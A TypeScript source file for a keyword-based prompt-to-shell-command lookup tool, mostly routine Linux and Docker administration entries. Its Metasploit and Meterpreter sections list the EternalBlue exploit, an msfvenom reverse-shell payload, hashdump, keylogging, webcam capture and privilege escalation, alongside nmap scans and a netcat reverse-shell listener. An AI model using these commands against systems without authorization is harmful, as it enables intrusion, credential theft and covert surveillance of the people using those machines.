interface CommandResult {
  command: string;
  explanation: string;
  category: string;
}

const commandDatabase = {
  // File Operations
  'file_operations': {
    patterns: ['file', 'copy', 'move', 'delete', 'remove', 'create', 'touch', 'mkdir', 'rmdir', 'chmod', 'chown', 'ls', 'find', 'locate', 'cp', 'mv', 'rm', 'ln', 'stat', 'tree', 'file', 'which', 'whereis'],
    commands: [
      {
        command: 'ls -la',
        explanation: 'Lists all files and directories in long format, including hidden files, with detailed permissions and ownership information.',
        category: 'File Operations',
        keywords: ['list', 'files', 'directories', 'long', 'format', 'hidden', 'permissions']
      },
      {
        command: 'find /path -name "*.txt" -type f',
        explanation: 'Searches for all .txt files in the specified path and subdirectories.',
        category: 'File Operations',
        keywords: ['find', 'search', 'txt', 'files', 'type']
      },
      {
        command: 'cp -r source_directory destination_directory',
        explanation: 'Recursively copies a directory and all its contents to a new location.',
        category: 'File Operations',
        keywords: ['copy', 'recursive', 'directory', 'contents']
      },
      {
        command: 'chmod 755 filename',
        explanation: 'Changes file permissions to read, write, execute for owner and read, execute for group and others.',
        category: 'File Operations',
        keywords: ['change', 'permissions', 'chmod', '755']
      },
      {
        command: 'tree -L 2',
        explanation: 'Displays directory structure in tree format, limiting depth to 2 levels.',
        category: 'File Operations',
        keywords: ['tree', 'directory', 'structure', 'levels']
      },
      {
        command: 'stat filename',
        explanation: 'Displays detailed information about a file including size, permissions, timestamps, and inode.',
        category: 'File Operations',
        keywords: ['stat', 'file', 'information', 'details', 'size']
      },
      {
        command: 'ln -s /path/to/original /path/to/link',
        explanation: 'Creates a symbolic link from the original file to the specified location.',
        category: 'File Operations',
        keywords: ['symbolic', 'link', 'create', 'original']
      }
    ]
  },

  // Network Operations - Enhanced with Nmap
  'network_operations': {
    patterns: ['network', 'ping', 'wget', 'curl', 'ssh', 'scp', 'rsync', 'netstat', 'ss', 'iptables', 'firewall', 'port', 'connection', 'nmap', 'dig', 'nslookup', 'telnet', 'ftp', 'sftp', 'nc', 'netcat', 'traceroute', 'mtr', 'whois', 'tcpdump', 'wireshark', 'scan', 'discover', 'enumerate'],
    commands: [
      // Nmap Commands
      {
        command: 'nmap -sn 192.168.1.0/24',
        explanation: 'Performs a ping scan to discover live hosts in the specified network range.',
        category: 'Network Operations',
        keywords: ['nmap', 'ping', 'scan', 'hosts', 'network', 'range', 'discover', 'host', 'discovery']
      },
      {
        command: 'nmap -sS target_ip',
        explanation: 'Performs TCP SYN scan (stealth scan) on target to identify open ports.',
        category: 'Network Operations',
        keywords: ['nmap', 'tcp', 'syn', 'scan', 'stealth', 'ports', 'open']
      },
      {
        command: 'nmap -sV target_ip',
        explanation: 'Performs version detection scan to identify service versions running on open ports.',
        category: 'Network Operations',
        keywords: ['nmap', 'version', 'detection', 'service', 'versions', 'banner']
      },
      {
        command: 'nmap -O target_ip',
        explanation: 'Performs OS fingerprinting to identify the target operating system.',
        category: 'Network Operations',
        keywords: ['nmap', 'os', 'fingerprint', 'operating', 'system', 'detection']
      },
      {
        command: 'nmap -A target_ip',
        explanation: 'Aggressive scan combining OS detection, version detection, script scanning, and traceroute.',
        category: 'Network Operations',
        keywords: ['nmap', 'aggressive', 'scan', 'comprehensive', 'detection', 'script']
      },
      {
        command: 'nmap -sU target_ip',
        explanation: 'Performs UDP scan to identify open UDP ports on target.',
        category: 'Network Operations',
        keywords: ['nmap', 'udp', 'scan', 'ports', 'user', 'datagram']
      },
      {
        command: 'nmap --script vuln target_ip',
        explanation: 'Runs vulnerability detection scripts against target to identify known vulnerabilities.',
        category: 'Network Operations',
        keywords: ['nmap', 'script', 'vulnerability', 'vuln', 'detection', 'exploit']
      },
      {
        command: 'nmap -p- target_ip',
        explanation: 'Scans all 65535 TCP ports on target for comprehensive port discovery.',
        category: 'Network Operations',
        keywords: ['nmap', 'all', 'ports', 'comprehensive', 'full', 'range']
      },
      {
        command: 'nmap -p 80,443,22,21 target_ip',
        explanation: 'Scans specific ports (HTTP, HTTPS, SSH, FTP) on target.',
        category: 'Network Operations',
        keywords: ['nmap', 'specific', 'ports', 'http', 'https', 'ssh', 'ftp']
      },
      {
        command: 'nmap -T4 target_ip',
        explanation: 'Fast timing template scan for quicker results on target.',
        category: 'Network Operations',
        keywords: ['nmap', 'timing', 'fast', 'aggressive', 'speed']
      },
      // ... keep existing code (other network commands)
      {
        command: 'dig google.com',
        explanation: 'Performs DNS lookup for google.com showing detailed DNS record information.',
        category: 'Network Operations',
        keywords: ['dig', 'dns', 'lookup', 'domain', 'records']
      },
      {
        command: 'netstat -tulpn',
        explanation: 'Shows all listening ports and their associated processes.',
        category: 'Network Operations',
        keywords: ['netstat', 'listening', 'ports', 'processes']
      },
      {
        command: 'ss -tuln',
        explanation: 'Modern replacement for netstat, shows socket statistics for TCP and UDP.',
        category: 'Network Operations',
        keywords: ['ss', 'socket', 'statistics', 'tcp', 'udp']
      },
      {
        command: 'tcpdump -i eth0 -w capture.pcap',
        explanation: 'Captures network packets on eth0 interface and saves to file for analysis.',
        category: 'Network Operations',
        keywords: ['tcpdump', 'capture', 'packets', 'interface', 'pcap']
      },
      {
        command: 'nc -l -p 4444',
        explanation: 'Creates a netcat listener on port 4444 for reverse shell or file transfer.',
        category: 'Network Operations',
        keywords: ['netcat', 'nc', 'listener', 'port', 'reverse', 'shell']
      },
      {
        command: 'traceroute google.com',
        explanation: 'Traces the network path to google.com showing all intermediate hops.',
        category: 'Network Operations',
        keywords: ['traceroute', 'trace', 'path', 'hops', 'route']
      }
    ]
  },

  // Metasploit Framework Commands
  'metasploit_operations': {
    patterns: ['metasploit', 'msfconsole', 'msfvenom', 'exploit', 'payload', 'auxiliary', 'post', 'encoder', 'nop', 'msf'],
    commands: [
      {
        command: 'msfconsole',
        explanation: 'Launches the Metasploit Framework console for interactive exploitation.',
        category: 'Metasploit Operations',
        keywords: ['msfconsole', 'metasploit', 'console', 'launch', 'start', 'framework']
      },
      {
        command: 'search type:exploit platform:windows',
        explanation: 'Searches for Windows exploits in Metasploit database.',
        category: 'Metasploit Operations',
        keywords: ['search', 'exploit', 'windows', 'platform', 'find']
      },
      {
        command: 'use exploit/windows/smb/ms17_010_eternalblue',
        explanation: 'Selects the EternalBlue SMB exploit for Windows systems.',
        category: 'Metasploit Operations',
        keywords: ['use', 'exploit', 'eternalblue', 'smb', 'ms17', 'windows']
      },
      {
        command: 'set RHOSTS 192.168.1.100',
        explanation: 'Sets the target host IP address for the selected exploit.',
        category: 'Metasploit Operations',
        keywords: ['set', 'rhosts', 'target', 'host', 'ip', 'address']
      },
      {
        command: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
        explanation: 'Sets a Windows 64-bit Meterpreter reverse TCP payload.',
        category: 'Metasploit Operations',
        keywords: ['set', 'payload', 'meterpreter', 'reverse', 'tcp', 'windows']
      },
      {
        command: 'set LHOST 192.168.1.50',
        explanation: 'Sets the local host IP address for reverse connections.',
        category: 'Metasploit Operations',
        keywords: ['set', 'lhost', 'local', 'host', 'ip', 'reverse']
      },
      {
        command: 'set LPORT 4444',
        explanation: 'Sets the local port for reverse connections.',
        category: 'Metasploit Operations',
        keywords: ['set', 'lport', 'local', 'port', 'listener']
      },
      {
        command: 'show options',
        explanation: 'Displays all configurable options for the current module.',
        category: 'Metasploit Operations',
        keywords: ['show', 'options', 'configure', 'parameters', 'settings']
      },
      {
        command: 'exploit',
        explanation: 'Executes the configured exploit against the target.',
        category: 'Metasploit Operations',
        keywords: ['exploit', 'execute', 'run', 'launch', 'attack']
      },
      {
        command: 'background',
        explanation: 'Backgrounds the current session to return to main console.',
        category: 'Metasploit Operations',
        keywords: ['background', 'session', 'return', 'console']
      },
      {
        command: 'sessions -l',
        explanation: 'Lists all active sessions.',
        category: 'Metasploit Operations',
        keywords: ['sessions', 'list', 'active', 'show']
      },
      {
        command: 'sessions -i 1',
        explanation: 'Interacts with session number 1.',
        category: 'Metasploit Operations',
        keywords: ['sessions', 'interact', 'connect', 'session']
      },
      {
        command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe',
        explanation: 'Generates a Windows executable payload with Meterpreter reverse TCP connection.',
        category: 'Metasploit Operations',
        keywords: ['msfvenom', 'payload', 'generate', 'executable', 'meterpreter', 'reverse']
      },
      {
        command: 'use auxiliary/scanner/portscan/tcp',
        explanation: 'Uses TCP port scanner auxiliary module.',
        category: 'Metasploit Operations',
        keywords: ['auxiliary', 'scanner', 'portscan', 'tcp', 'port']
      },
      {
        command: 'use post/windows/gather/hashdump',
        explanation: 'Uses post-exploitation module to dump password hashes.',
        category: 'Metasploit Operations',
        keywords: ['post', 'exploitation', 'hashdump', 'passwords', 'gather']
      }
    ]
  },

  // Meterpreter Commands
  'meterpreter_operations': {
    patterns: ['meterpreter', 'meterpreter session', 'shell', 'post exploitation', 'privilege escalation'],
    commands: [
      {
        command: 'sysinfo',
        explanation: 'Displays system information about the compromised target.',
        category: 'Meterpreter Operations',
        keywords: ['sysinfo', 'system', 'information', 'target', 'details']
      },
      {
        command: 'getuid',
        explanation: 'Shows the current user ID and privileges on the target system.',
        category: 'Meterpreter Operations',
        keywords: ['getuid', 'user', 'id', 'privileges', 'current']
      },
      {
        command: 'getsystem',
        explanation: 'Attempts to escalate privileges to SYSTEM level on Windows.',
        category: 'Meterpreter Operations',
        keywords: ['getsystem', 'privilege', 'escalation', 'system', 'windows']
      },
      {
        command: 'ps',
        explanation: 'Lists all running processes on the target system.',
        category: 'Meterpreter Operations',
        keywords: ['ps', 'processes', 'running', 'list', 'show']
      },
      {
        command: 'migrate 1234',
        explanation: 'Migrates the Meterpreter session to process ID 1234.',
        category: 'Meterpreter Operations',
        keywords: ['migrate', 'process', 'move', 'pid', 'stealth']
      },
      {
        command: 'hashdump',
        explanation: 'Dumps password hashes from the target system.',
        category: 'Meterpreter Operations',
        keywords: ['hashdump', 'passwords', 'hashes', 'dump', 'credentials']
      },
      {
        command: 'screenshot',
        explanation: 'Takes a screenshot of the target desktop.',
        category: 'Meterpreter Operations',
        keywords: ['screenshot', 'desktop', 'capture', 'image', 'screen']
      },
      {
        command: 'webcam_snap',
        explanation: 'Takes a picture using the target webcam.',
        category: 'Meterpreter Operations',
        keywords: ['webcam', 'snap', 'picture', 'camera', 'capture']
      },
      {
        command: 'keyscan_start',
        explanation: 'Starts keylogger to capture keystrokes.',
        category: 'Meterpreter Operations',
        keywords: ['keyscan', 'keylogger', 'start', 'capture', 'keystrokes']
      },
      {
        command: 'keyscan_dump',
        explanation: 'Dumps captured keystrokes from keylogger.',
        category: 'Meterpreter Operations',
        keywords: ['keyscan', 'dump', 'keystrokes', 'show', 'captured']
      },
      {
        command: 'download C:\\important.txt /tmp/',
        explanation: 'Downloads a file from target to local system.',
        category: 'Meterpreter Operations',
        keywords: ['download', 'file', 'transfer', 'get', 'copy']
      },
      {
        command: 'upload /tmp/file.exe C:\\temp\\',
        explanation: 'Uploads a file from local system to target.',
        category: 'Meterpreter Operations',
        keywords: ['upload', 'file', 'transfer', 'put', 'copy']
      },
      {
        command: 'shell',
        explanation: 'Drops into a system shell on the target.',
        category: 'Meterpreter Operations',
        keywords: ['shell', 'command', 'prompt', 'system', 'terminal']
      },
      {
        command: 'run post/windows/manage/enable_rdp',
        explanation: 'Enables Remote Desktop Protocol on Windows target.',
        category: 'Meterpreter Operations',
        keywords: ['run', 'post', 'rdp', 'remote', 'desktop', 'enable']
      },
      {
        command: 'portfwd add -l 3389 -p 3389 -r 192.168.1.100',
        explanation: 'Sets up port forwarding for RDP access.',
        category: 'Meterpreter Operations',
        keywords: ['portfwd', 'port', 'forwarding', 'tunnel', 'rdp']
      }
    ]
  },

  // Docker Commands
  'docker_operations': {
    patterns: ['docker', 'container', 'image', 'dockerfile', 'compose', 'registry', 'hub'],
    commands: [
      {
        command: 'docker run -it ubuntu:latest /bin/bash',
        explanation: 'Runs an interactive Ubuntu container with bash shell.',
        category: 'Docker Operations',
        keywords: ['docker', 'run', 'interactive', 'ubuntu', 'bash', 'container']
      },
      {
        command: 'docker ps',
        explanation: 'Lists all currently running Docker containers.',
        category: 'Docker Operations',
        keywords: ['docker', 'ps', 'list', 'running', 'containers', 'show']
      },
      {
        command: 'docker ps -a',
        explanation: 'Lists all Docker containers including stopped ones.',
        category: 'Docker Operations',
        keywords: ['docker', 'ps', 'all', 'containers', 'stopped', 'list']
      },
      {
        command: 'docker images',
        explanation: 'Lists all Docker images stored locally.',
        category: 'Docker Operations',
        keywords: ['docker', 'images', 'list', 'local', 'stored']
      },
      {
        command: 'docker pull nginx:latest',
        explanation: 'Downloads the latest Nginx image from Docker Hub.',
        category: 'Docker Operations',
        keywords: ['docker', 'pull', 'download', 'nginx', 'image', 'hub']
      },
      {
        command: 'docker build -t myapp:1.0 .',
        explanation: 'Builds a Docker image from Dockerfile in current directory with tag.',
        category: 'Docker Operations',
        keywords: ['docker', 'build', 'image', 'dockerfile', 'tag', 'create']
      },
      {
        command: 'docker stop container_name',
        explanation: 'Stops a running Docker container by name.',
        category: 'Docker Operations',
        keywords: ['docker', 'stop', 'container', 'halt', 'shutdown']
      },
      {
        command: 'docker start container_name',
        explanation: 'Starts a stopped Docker container by name.',
        category: 'Docker Operations',
        keywords: ['docker', 'start', 'container', 'run', 'launch']
      },
      {
        command: 'docker rm container_name',
        explanation: 'Removes a Docker container by name.',
        category: 'Docker Operations',
        keywords: ['docker', 'rm', 'remove', 'delete', 'container']
      },
      {
        command: 'docker rmi image_name',
        explanation: 'Removes a Docker image by name.',
        category: 'Docker Operations',
        keywords: ['docker', 'rmi', 'remove', 'delete', 'image']
      },
      {
        command: 'docker exec -it container_name /bin/bash',
        explanation: 'Executes bash shell inside a running container.',
        category: 'Docker Operations',
        keywords: ['docker', 'exec', 'execute', 'bash', 'shell', 'interactive']
      },
      {
        command: 'docker logs container_name',
        explanation: 'Shows logs from a Docker container.',
        category: 'Docker Operations',
        keywords: ['docker', 'logs', 'container', 'output', 'show']
      },
      {
        command: 'docker-compose up -d',
        explanation: 'Starts services defined in docker-compose.yml in detached mode.',
        category: 'Docker Operations',
        keywords: ['docker-compose', 'up', 'start', 'services', 'detached', 'background']
      },
      {
        command: 'docker-compose down',
        explanation: 'Stops and removes containers, networks created by docker-compose up.',
        category: 'Docker Operations',
        keywords: ['docker-compose', 'down', 'stop', 'remove', 'cleanup']
      },
      {
        command: 'docker system prune',
        explanation: 'Removes unused containers, networks, images, and build cache.',
        category: 'Docker Operations',
        keywords: ['docker', 'system', 'prune', 'cleanup', 'remove', 'unused']
      },
      {
        command: 'docker volume ls',
        explanation: 'Lists all Docker volumes.',
        category: 'Docker Operations',
        keywords: ['docker', 'volume', 'list', 'storage', 'show']
      },
      {
        command: 'docker network ls',
        explanation: 'Lists all Docker networks.',
        category: 'Docker Operations',
        keywords: ['docker', 'network', 'list', 'show', 'networking']
      },
      {
        command: 'docker inspect container_name',
        explanation: 'Shows detailed information about a Docker container.',
        category: 'Docker Operations',
        keywords: ['docker', 'inspect', 'information', 'details', 'container']
      },
      {
        command: 'docker cp file.txt container_name:/path/',
        explanation: 'Copies files between host and Docker container.',
        category: 'Docker Operations',
        keywords: ['docker', 'cp', 'copy', 'file', 'transfer', 'container']
      },
      {
        command: 'docker run -d -p 80:80 nginx',
        explanation: 'Runs Nginx container in background with port mapping.',
        category: 'Docker Operations',
        keywords: ['docker', 'run', 'detached', 'port', 'mapping', 'nginx', 'background']
      }
    ]
  },

  // System Monitoring
  'system_monitoring': {
    patterns: ['system', 'process', 'memory', 'cpu', 'disk', 'monitor', 'top', 'htop', 'ps', 'kill', 'df', 'du', 'free', 'uptime', 'load', 'iostat', 'vmstat', 'sar', 'lsof', 'who', 'w', 'last', 'history'],
    commands: [
      {
        command: 'htop',
        explanation: 'Interactive process viewer with color-coded display of CPU, memory usage and system load.',
        category: 'System Monitoring',
        keywords: ['htop', 'interactive', 'process', 'viewer', 'cpu', 'memory', 'load']
      },
      {
        command: 'ps aux --sort=-%cpu | head -10',
        explanation: 'Shows top 10 processes consuming the most CPU resources.',
        category: 'System Monitoring',
        keywords: ['ps', 'processes', 'cpu', 'top', 'consuming', 'resources']
      },
      {
        command: 'lsof -i :80',
        explanation: 'Lists all processes using port 80, useful for identifying web server processes.',
        category: 'System Monitoring',
        keywords: ['lsof', 'processes', 'port', '80', 'web', 'server']
      },
      {
        command: 'iostat -x 1',
        explanation: 'Displays extended I/O statistics for all devices, updating every second.',
        category: 'System Monitoring',
        keywords: ['iostat', 'io', 'statistics', 'devices', 'extended']
      },
      {
        command: 'vmstat 1 5',
        explanation: 'Shows virtual memory statistics for 5 iterations with 1 second intervals.',
        category: 'System Monitoring',
        keywords: ['vmstat', 'virtual', 'memory', 'statistics', 'intervals']
      },
      {
        command: 'sar -u 1 10',
        explanation: 'Displays CPU utilization statistics every second for 10 iterations.',
        category: 'System Monitoring',
        keywords: ['sar', 'cpu', 'utilization', 'statistics']
      },
      {
        command: 'who -a',
        explanation: 'Shows all currently logged in users with detailed login information.',
        category: 'System Monitoring',
        keywords: ['who', 'logged', 'users', 'login', 'information']
      }
    ]
  },

  // Text Processing
  'text_processing': {
    patterns: ['text', 'grep', 'sed', 'awk', 'cat', 'head', 'tail', 'sort', 'uniq', 'wc', 'cut', 'tr', 'search', 'replace', 'filter', 'less', 'more', 'vim', 'nano', 'emacs'],
    commands: [
      {
        command: 'grep -r "ERROR" /var/log/',
        explanation: 'Recursively searches for "ERROR" in all log files under /var/log directory.',
        category: 'Text Processing',
        keywords: ['grep', 'search', 'recursive', 'error', 'log', 'files']
      },
      {
        command: 'sed -i "s/old_text/new_text/g" filename',
        explanation: 'Replaces all occurrences of old_text with new_text in the specified file.',
        category: 'Text Processing',
        keywords: ['sed', 'replace', 'text', 'substitute', 'file']
      },
      {
        command: 'awk "{print $1, $3}" /etc/passwd',
        explanation: 'Prints the first and third columns from /etc/passwd file (username and UID).',
        category: 'Text Processing',
        keywords: ['awk', 'print', 'columns', 'passwd', 'username', 'uid']
      },
      {
        command: 'tail -f /var/log/syslog',
        explanation: 'Continuously displays the last lines of the system log as new entries are added.',
        category: 'Text Processing',
        keywords: ['tail', 'follow', 'log', 'continuous', 'monitor']
      },
      {
        command: 'sort filename | uniq -c | sort -nr',
        explanation: 'Sorts file, counts duplicate lines, then sorts by frequency in descending order.',
        category: 'Text Processing',
        keywords: ['sort', 'unique', 'count', 'frequency', 'duplicate']
      },
      {
        command: 'cut -d: -f1 /etc/passwd',
        explanation: 'Extracts usernames from /etc/passwd by cutting the first field using colon delimiter.',
        category: 'Text Processing',
        keywords: ['cut', 'extract', 'field', 'delimiter', 'passwd', 'username']
      }
    ]
  },

  // Archive Operations
  'archive_operations': {
    patterns: ['archive', 'compress', 'extract', 'zip', 'unzip', 'tar', 'gzip', 'gunzip', 'backup', '7z', 'rar', 'bzip2'],
    commands: [
      {
        command: 'tar -czf backup.tar.gz /home/user/',
        explanation: 'Creates a compressed tar archive of the user home directory.',
        category: 'Archive Operations',
        keywords: ['tar', 'compress', 'archive', 'backup', 'gzip']
      },
      {
        command: 'tar -xzf archive.tar.gz -C /destination/',
        explanation: 'Extracts a compressed tar archive to the specified destination directory.',
        category: 'Archive Operations',
        keywords: ['tar', 'extract', 'archive', 'destination', 'uncompress']
      },
      {
        command: 'zip -r archive.zip /path/to/directory',
        explanation: 'Creates a ZIP archive of the specified directory and its contents.',
        category: 'Archive Operations',
        keywords: ['zip', 'create', 'archive', 'directory', 'recursive']
      },
      {
        command: '7z a -t7z archive.7z /path/to/directory/',
        explanation: 'Creates a 7z archive with maximum compression of the specified directory.',
        category: 'Archive Operations',
        keywords: ['7z', '7zip', 'archive', 'compression', 'maximum']
      }
    ]
  },

  // Security & Permissions
  'security_operations': {
    patterns: ['security', 'permission', 'user', 'group', 'sudo', 'su', 'passwd', 'useradd', 'usermod', 'userdel', 'groups', 'id', 'whoami', 'chroot', 'umask', 'acl', 'selinux', 'apparmor'],
    commands: [
      {
        command: 'find / -perm -4000 2>/dev/null',
        explanation: 'Finds all files with SUID bit set, which could be potential security risks.',
        category: 'Security Operations',
        keywords: ['find', 'suid', 'permissions', 'security', 'risks']
      },
      {
        command: 'sudo useradd -m -s /bin/bash -G sudo username',
        explanation: 'Creates a new user with home directory, bash shell, and sudo privileges.',
        category: 'Security Operations',
        keywords: ['useradd', 'user', 'create', 'home', 'bash', 'sudo']
      },
      {
        command: 'getfacl filename',
        explanation: 'Displays Access Control List (ACL) permissions for the specified file.',
        category: 'Security Operations',
        keywords: ['getfacl', 'acl', 'permissions', 'access', 'control']
      },
      {
        command: 'chattr +i filename',
        explanation: 'Makes a file immutable, preventing it from being modified or deleted.',
        category: 'Security Operations',
        keywords: ['chattr', 'immutable', 'protect', 'file', 'prevent']
      },
      {
        command: 'last -n 10',
        explanation: 'Shows the last 10 login sessions, useful for security auditing.',
        category: 'Security Operations',
        keywords: ['last', 'login', 'sessions', 'audit', 'security']
      }
    ]
  },

  // Service Management
  'service_management': {
    patterns: ['service', 'systemd', 'systemctl', 'daemon', 'start', 'stop', 'restart', 'enable', 'disable', 'status', 'journalctl', 'cron', 'crontab', 'at', 'batch'],
    commands: [
      {
        command: 'systemctl --failed',
        explanation: 'Lists all failed systemd services that need attention.',
        category: 'Service Management',
        keywords: ['systemctl', 'failed', 'services', 'systemd']
      },
      {
        command: 'journalctl -u apache2 --since "1 hour ago"',
        explanation: 'Shows logs for apache2 service from the last hour.',
        category: 'Service Management',
        keywords: ['journalctl', 'logs', 'apache2', 'service', 'hour']
      },
      {
        command: 'crontab -l',
        explanation: 'Lists all scheduled cron jobs for the current user.',
        category: 'Service Management',
        keywords: ['crontab', 'cron', 'scheduled', 'jobs', 'list']
      },
      {
        command: 'systemctl list-units --type=service --state=running',
        explanation: 'Lists all currently running systemd services.',
        category: 'Service Management',
        keywords: ['systemctl', 'list', 'running', 'services', 'units']
      }
    ]
  },

  // Package Management
  'package_management': {
    patterns: ['package', 'install', 'update', 'upgrade', 'remove', 'apt', 'yum', 'dnf', 'pacman', 'zypper', 'snap', 'flatpak', 'pip', 'npm', 'gem'],
    commands: [
      {
        command: 'apt list --upgradable',
        explanation: 'Shows all packages that have available updates on Debian/Ubuntu systems.',
        category: 'Package Management',
        keywords: ['apt', 'list', 'upgradable', 'updates', 'packages']
      },
      {
        command: 'dnf search keyword',
        explanation: 'Searches for packages containing the keyword in Fedora/RHEL systems.',
        category: 'Package Management',
        keywords: ['dnf', 'search', 'packages', 'fedora', 'rhel']
      },
      {
        command: 'snap list',
        explanation: 'Lists all installed snap packages with their versions.',
        category: 'Package Management',
        keywords: ['snap', 'list', 'installed', 'packages', 'versions']
      },
      {
        command: 'pip list --outdated',
        explanation: 'Shows all outdated Python packages installed via pip.',
        category: 'Package Management',
        keywords: ['pip', 'list', 'outdated', 'python', 'packages']
      }
    ]
  },

  // Database Operations
  'database_operations': {
    patterns: ['database', 'mysql', 'postgresql', 'sqlite', 'mongo', 'redis', 'sql', 'backup', 'dump', 'restore'],
    commands: [
      {
        command: 'mysqldump -u root -p database_name > backup.sql',
        explanation: 'Creates a backup of MySQL database to a SQL file.',
        category: 'Database Operations',
        keywords: ['mysqldump', 'backup', 'mysql', 'database', 'sql']
      },
      {
        command: 'pg_dump -U username database_name > backup.sql',
        explanation: 'Creates a backup of PostgreSQL database to a SQL file.',
        category: 'Database Operations',
        keywords: ['pg_dump', 'backup', 'postgresql', 'database', 'sql']
      },
      {
        command: 'sqlite3 database.db ".dump" > backup.sql',
        explanation: 'Creates a backup of SQLite database to a SQL file.',
        category: 'Database Operations',
        keywords: ['sqlite3', 'backup', 'sqlite', 'database', 'dump']
      },
      {
        command: 'redis-cli --rdb backup.rdb',
        explanation: 'Creates a backup of Redis database in RDB format.',
        category: 'Database Operations',
        keywords: ['redis-cli', 'backup', 'redis', 'database', 'rdb']
      }
    ]
  },

  // Web Server Operations
  'web_server_operations': {
    patterns: ['apache', 'nginx', 'web', 'server', 'http', 'https', 'ssl', 'certificate', 'vhost', 'site'],
    commands: [
      {
        command: 'apache2ctl configtest',
        explanation: 'Tests Apache configuration files for syntax errors.',
        category: 'Web Server Operations',
        keywords: ['apache2ctl', 'configtest', 'apache', 'configuration', 'test']
      },
      {
        command: 'nginx -t',
        explanation: 'Tests Nginx configuration files for syntax errors.',
        category: 'Web Server Operations',
        keywords: ['nginx', 'test', 'configuration', 'syntax']
      },
      {
        command: 'openssl x509 -in certificate.crt -text -noout',
        explanation: 'Displays detailed information about an SSL certificate.',
        category: 'Web Server Operations',
        keywords: ['openssl', 'x509', 'certificate', 'ssl', 'information']
      },
      {
        command: 'curl -I -k https://example.com',
        explanation: 'Retrieves HTTP headers from HTTPS site, ignoring SSL certificate errors.',
        category: 'Web Server Operations',
        keywords: ['curl', 'headers', 'https', 'ssl', 'ignore']
      }
    ]
  },

  // System Information
  'system_information': {
    patterns: ['info', 'information', 'version', 'kernel', 'hardware', 'cpu', 'memory', 'disk', 'uname', 'lscpu', 'lsblk', 'lsusb', 'lspci', 'dmidecode'],
    commands: [
      {
        command: 'uname -a',
        explanation: 'Displays complete system information including kernel version and architecture.',
        category: 'System Information',
        keywords: ['uname', 'system', 'information', 'kernel', 'version']
      },
      {
        command: 'lscpu',
        explanation: 'Displays detailed CPU architecture and feature information.',
        category: 'System Information',
        keywords: ['lscpu', 'cpu', 'architecture', 'features', 'information']
      },
      {
        command: 'lsblk',
        explanation: 'Lists all block devices in tree format showing disk partitioning.',
        category: 'System Information',
        keywords: ['lsblk', 'block', 'devices', 'disk', 'partitions']
      },
      {
        command: 'dmidecode -t memory',
        explanation: 'Shows detailed memory information including type, speed, and slots.',
        category: 'System Information',
        keywords: ['dmidecode', 'memory', 'information', 'type', 'speed']
      },
      {
        command: 'lshw -short',
        explanation: 'Displays hardware information in short format.',
        category: 'System Information',
        keywords: ['lshw', 'hardware', 'information', 'short']
      }
    ]
  },

  // Development Tools
  'development_tools': {
    patterns: ['git', 'docker', 'kubernetes', 'k8s', 'make', 'gcc', 'python', 'node', 'java', 'build', 'compile', 'debug'],
    commands: [
      {
        command: 'git log --oneline --graph --all',
        explanation: 'Shows git commit history in a compact graphical format for all branches.',
        category: 'Development Tools',
        keywords: ['git', 'log', 'history', 'graph', 'branches']
      },
      {
        command: 'docker ps -a',
        explanation: 'Lists all Docker containers including stopped ones.',
        category: 'Development Tools',
        keywords: ['docker', 'ps', 'containers', 'list', 'all']
      },
      {
        command: 'kubectl get pods --all-namespaces',
        explanation: 'Lists all Kubernetes pods across all namespaces.',
        category: 'Development Tools',
        keywords: ['kubectl', 'pods', 'kubernetes', 'namespaces', 'all']
      },
      {
        command: 'make clean && make',
        explanation: 'Cleans previous build artifacts and compiles the project.',
        category: 'Development Tools',
        keywords: ['make', 'clean', 'build', 'compile', 'artifacts']
      },
      {
        command: 'strace -p PID',
        explanation: 'Traces system calls made by a running process for debugging.',
        category: 'Development Tools',
        keywords: ['strace', 'trace', 'system', 'calls', 'debug']
      }
    ]
  }
};

function findBestMatchingCommand(prompt: string, commands: any[]): any | null {
  const cleanPrompt = prompt.toLowerCase();
  let bestMatch = null;
  let bestScore = 0;

  for (const command of commands) {
    let score = 0;
    
    // Check if command keywords match the prompt
    if (command.keywords) {
      for (const keyword of command.keywords) {
        if (cleanPrompt.includes(keyword.toLowerCase())) {
          score += keyword.length * 2; // Weight longer keywords more
        }
      }
    }
    
    // Additional scoring for command name match
    const commandName = command.command.split(' ')[0];
    if (cleanPrompt.includes(commandName)) {
      score += commandName.length * 3;
    }
    
    if (score > bestScore) {
      bestScore = score;
      bestMatch = command;
    }
  }
  
  return bestScore > 0 ? bestMatch : null;
}

export async function generateBashCommand(prompt: string): Promise<CommandResult> {
  const cleanPrompt = String(prompt || '').trim().toLowerCase();
  
  if (!cleanPrompt) {
    throw new Error('Please provide a valid prompt');
  }

  // First, find the best matching category
  let bestCategoryMatch = null;
  let bestCategoryScore = 0;
  let matchedKeywords: string[] = [];

  for (const [category, data] of Object.entries(commandDatabase)) {
    let score = 0;
    let currentKeywords: string[] = [];
    
    for (const pattern of data.patterns) {
      if (cleanPrompt.includes(pattern)) {
        score += pattern.length * 2;
        currentKeywords.push(pattern);
      }
    }
    
    if (score > bestCategoryScore) {
      bestCategoryScore = score;
      bestCategoryMatch = { category, data };
      matchedKeywords = currentKeywords;
    }
  }

  // If we found a matching category, find the best command within it
  if (bestCategoryMatch && bestCategoryScore > 0) {
    const bestCommand = findBestMatchingCommand(cleanPrompt, bestCategoryMatch.data.commands);
    
    if (bestCommand) {
      return {
        command: bestCommand.command,
        explanation: bestCommand.explanation,
        category: bestCommand.category
      };
    }
  }
  
  // Default response when no specific match is found
  return {
    command: 'echo "Command not found. Please be more specific."',
    explanation: `I couldn't find a specific command for "${prompt}". Try using more specific keywords like: 'nmap' for network scanning, 'msfconsole' for Metasploit, 'meterpreter' for post-exploitation, 'docker' for containers, 'grep' for text search, 'systemctl' for service management, 'git' for version control, 'find' for file search, 'ps' for processes, or describe your task more specifically.`,
    category: 'Help'
  };
}
